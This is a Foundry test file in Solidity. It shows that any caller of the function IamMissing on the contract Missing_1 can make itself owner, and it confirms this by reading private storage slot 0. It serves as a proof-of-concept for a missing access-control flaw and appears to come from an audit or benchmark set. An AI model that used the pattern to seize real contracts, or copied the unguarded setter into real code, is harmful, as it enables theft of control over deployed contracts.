
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_1} from "../src/Missing_1.sol";

contract TestAccessControlMissing_1 is Test {
    Missing_1 public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new Missing_1();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude current owner (privileged role)
        // Since 'owner' is private and at slot 0, we load it to ensure the caller isn't already the owner.
        bytes32 ownerSlotBefore = vm.load(address(_contractUnderTest), bytes32(uint256(0)));
        address currentOwner = address(uint160(uint256(ownerSlotBefore)));
        vm.assume(caller != currentOwner);

        // --- 2. State Configuration ---
        // No funding or specific state required for this vulnerability.

        // --- 3. Execution & Assertion ---
        
        vm.prank(caller);

        // TRIGGER VULNERABILITY
        _contractUnderTest.IamMissing();

        // ASSERT SUCCESS
        // Verify that the caller successfully became the owner by reading the private storage slot 0.
        bytes32 ownerSlotAfter = vm.load(address(_contractUnderTest), bytes32(uint256(0)));
        address newOwner = address(uint160(uint256(ownerSlotAfter)));
        
        assertEq(newOwner, caller, "Arbitrary user should be able to take ownership via IamMissing");
    }
}
